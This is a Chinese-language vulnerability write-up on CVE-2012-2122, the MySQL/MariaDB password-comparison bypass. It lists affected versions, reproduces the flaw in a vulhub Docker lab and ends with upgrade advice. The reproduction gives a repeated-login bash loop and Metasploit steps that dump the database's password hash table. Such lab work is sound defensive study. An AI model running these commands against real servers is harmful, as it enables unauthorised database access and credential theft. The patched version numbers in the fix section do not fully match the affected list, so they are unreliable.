### 1.1、漏洞描述

当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值（-128到127范围内的值），也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。大约256次就可以成功一次。

### 1.2、漏洞等级

高

### 1.3、影响版本

MySQL

- 5.1.x before 5.1.63
- 5.5.x before 5.5.24,

- 5.6.x before 5.6.6,

MariaDB

- 5.1.x before 5.1.62,
-  5.2.x before 5.2.12
- 5.3.x before 5.3.6
- 5.5.x before 5.5.23

### 1.4、漏洞复现

#### 1、基础环境

Path：vulhub/mysql/CVE-2012-2122

---

启动测试环境：

```bash
sudo docker-compose up -d
```



#### 2、漏洞验证

方式一：

```bash
for i in `seq 1 1000`;do mysql -uroot -phacktest -h 192.168.0.104 -P3306;done

-p后的密码可以随意
```

方式二：

```bash
msfconsole          // 启动msf工具                         
use auxiliary/scanner/mysql/mysql_authbypass_hashdump  //使用mysql无CVE-2012-2122利用模块
show options //查看需要设置哪些参数
需要设置RHOSTS——靶机ip、RPORT——mysql服务端口、USERNAME——mysql数据库名、THREADS——启用线程
通过set [方法] [参数] 例如设置启动线程为100：set THREADS 100
按如上参数设置完参数后在命令行输入run进行运行
最后可以获得该mysql数据库密码表进行利用
查看密码表：
cd /home/kali/.msf6/loot/ 本机装的是msf6.0所以.msf6目录下
ls查看该目录下文件可以看到上述msf爆破得到的.txt的密码表

```



### 1.5、修复建议

建议升级MySQL版本（5.0版本低于5.0.96；5.1版本低于5.1.63；5.5版本低于5.5.25）。为了预防升级失败，应备份整个mysql、安装目录、data目录等。

